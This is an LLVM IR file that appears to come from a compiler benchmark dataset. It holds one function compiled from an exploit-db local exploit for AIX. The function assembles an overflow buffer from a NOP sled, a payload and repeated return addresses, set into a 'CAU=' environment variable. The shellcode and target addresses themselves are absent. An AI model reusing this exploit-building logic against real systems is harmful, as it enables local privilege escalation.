; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/aix/local/extr_1045.c_cex_load_environment.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/aix/local/extr_1045.c_cex_load_environment.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@DEBUG = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [37 x i8] c"Adding nops to environment buffer...\00", align 1
@NOP = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [12 x i8] c"size %d...\0A\00", align 1
@.str.2 = private unnamed_addr constant [40 x i8] c"Adding payload to environment buffer...\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"CAU=\00", align 1
@ADDRESS = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [27 x i8] c"Going for address @ 0x%lx\0A\00", align 1
@.str.5 = private unnamed_addr constant [35 x i8] c"Adding return address to buffer...\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i64 @cex_load_environment(i8* %0, i8* %1, i8* %2, i32 %3, i32 %4) #0 {
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i64, align 8
  %14 = alloca i64*, align 8
  store i8* %0, i8** %6, align 8
  store i8* %1, i8** %7, align 8
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 %4, i32* %10, align 4
  %15 = load i8*, i8** %8, align 8
  %16 = call i32 @strlen(i8* %15)
  %17 = load i32, i32* %9, align 4
  %18 = add nsw i32 %16, %17
  %19 = add nsw i32 %18, 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* %12, align 4
  %21 = load i64, i64* @DEBUG, align 8
  %22 = icmp ne i64 %21, 0
  br i1 %22, label %23, label %25

23:                                               ; preds = %5
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str, i64 0, i64 0))
  br label %25

25:                                               ; preds = %23, %5
  store i32 0, i32* %11, align 4
  br label %26

26:                                               ; preds = %39, %25
  %27 = load i32, i32* %11, align 4
  %28 = load i32, i32* %12, align 4
  %29 = load i8*, i8** %8, align 8
  %30 = call i32 @strlen(i8* %29)
  %31 = sub nsw i32 %28, %30
  %32 = sub nsw i32 %31, 1
  %33 = icmp slt i32 %27, %32
  br i1 %33, label %34, label %42

34:                                               ; preds = %26
  %35 = load i32, i32* @NOP, align 4
  %36 = trunc i32 %35 to i8
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i32 1
  store i8* %38, i8** %6, align 8
  store i8 %36, i8* %37, align 1
  br label %39

39:                                               ; preds = %34
  %40 = load i32, i32* %11, align 4
  %41 = add nsw i32 %40, 1
  store i32 %41, i32* %11, align 4
  br label %26

42:                                               ; preds = %26
  %43 = load i64, i64* @DEBUG, align 8
  %44 = icmp ne i64 %43, 0
  br i1 %44, label %45, label %48

45:                                               ; preds = %42
  %46 = load i32, i32* %11, align 4
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0), i32 %46)
  br label %48

48:                                               ; preds = %45, %42
  %49 = load i64, i64* @DEBUG, align 8
  %50 = icmp ne i64 %49, 0
  br i1 %50, label %51, label %53

51:                                               ; preds = %48
  %52 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.2, i64 0, i64 0))
  br label %53

53:                                               ; preds = %51, %48
  store i32 0, i32* %11, align 4
  br label %54

54:                                               ; preds = %67, %53
  %55 = load i32, i32* %11, align 4
  %56 = load i8*, i8** %8, align 8
  %57 = call i32 @strlen(i8* %56)
  %58 = icmp slt i32 %55, %57
  br i1 %58, label %59, label %70

59:                                               ; preds = %54
  %60 = load i8*, i8** %8, align 8
  %61 = load i32, i32* %11, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds i8, i8* %60, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = load i8*, i8** %6, align 8
  %66 = getelementptr inbounds i8, i8* %65, i32 1
  store i8* %66, i8** %6, align 8
  store i8 %64, i8* %65, align 1
  br label %67

67:                                               ; preds = %59
  %68 = load i32, i32* %11, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %11, align 4
  br label %54

70:                                               ; preds = %54
  %71 = load i64, i64* @DEBUG, align 8
  %72 = icmp ne i64 %71, 0
  br i1 %72, label %73, label %76

73:                                               ; preds = %70
  %74 = load i32, i32* %11, align 4
  %75 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0), i32 %74)
  br label %76

76:                                               ; preds = %73, %70
  %77 = load i8*, i8** %6, align 8
  %78 = load i32, i32* %12, align 4
  %79 = sub nsw i32 %78, 1
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %77, i64 %80
  store i8 0, i8* %81, align 1
  %82 = load i8*, i8** %6, align 8
  %83 = call i32 @memcpy(i8* %82, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0), i32 4)
  %84 = load i8*, i8** %7, align 8
  %85 = load i32, i32* %10, align 4
  %86 = call i32 @memset(i8* %84, i8 signext 65, i32 %85)
  %87 = load i64, i64* @ADDRESS, align 8
  store i64 %87, i64* %13, align 8
  %88 = load i64, i64* @DEBUG, align 8
  %89 = icmp ne i64 %88, 0
  br i1 %89, label %90, label %93

90:                                               ; preds = %76
  %91 = load i64, i64* %13, align 8
  %92 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.4, i64 0, i64 0), i64 %91)
  br label %93

93:                                               ; preds = %90, %76
  %94 = load i64, i64* @DEBUG, align 8
  %95 = icmp ne i64 %94, 0
  br i1 %95, label %96, label %98

96:                                               ; preds = %93
  %97 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.5, i64 0, i64 0))
  br label %98

98:                                               ; preds = %96, %93
  %99 = load i8*, i8** %7, align 8
  %100 = getelementptr inbounds i8, i8* %99, i64 3
  %101 = bitcast i8* %100 to i64*
  store i64* %101, i64** %14, align 8
  store i32 0, i32* %11, align 4
  br label %102

102:                                              ; preds = %110, %98
  %103 = load i32, i32* %11, align 4
  %104 = load i32, i32* %10, align 4
  %105 = icmp slt i32 %103, %104
  br i1 %105, label %106, label %113

106:                                              ; preds = %102
  %107 = load i64, i64* %13, align 8
  %108 = load i64*, i64** %14, align 8
  %109 = getelementptr inbounds i64, i64* %108, i32 1
  store i64* %109, i64** %14, align 8
  store i64 %107, i64* %108, align 8
  br label %110

110:                                              ; preds = %106
  %111 = load i32, i32* %11, align 4
  %112 = add nsw i32 %111, 4
  store i32 %112, i32* %11, align 4
  br label %102

113:                                              ; preds = %102
  %114 = load i64, i64* @DEBUG, align 8
  %115 = icmp ne i64 %114, 0
  br i1 %115, label %116, label %119

116:                                              ; preds = %113
  %117 = load i32, i32* %11, align 4
  %118 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0), i32 %117)
  br label %119

119:                                              ; preds = %116, %113
  %120 = load i8*, i8** %7, align 8
  %121 = load i32, i32* %10, align 4
  %122 = sub nsw i32 %121, 1
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds i8, i8* %120, i64 %123
  store i8 0, i8* %124, align 1
  ret i64 0
}

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
